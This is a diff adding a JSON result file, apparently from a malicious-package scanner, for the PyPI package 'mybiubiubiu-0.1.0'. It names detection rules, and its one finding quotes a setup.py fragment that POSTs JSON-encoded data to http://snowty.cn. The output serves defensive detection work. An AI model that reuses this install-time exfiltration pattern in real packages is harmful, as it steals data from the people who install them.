@@ -1,0 +1,24 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:70",
+                "code": "        request(\n            url=\"http://snowty.cn\",\n            method='POST',\n            data=json.dumps(data).encode(\"utf-8\", errors='ignore'),\n            headers=headers\n        )\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "code-execution": {},
+        "download-executable": {},
+        "shady-links": {}
+    },
+    "path": "./dataset/pypi/mybiubiubiu-0.1.0"
+}
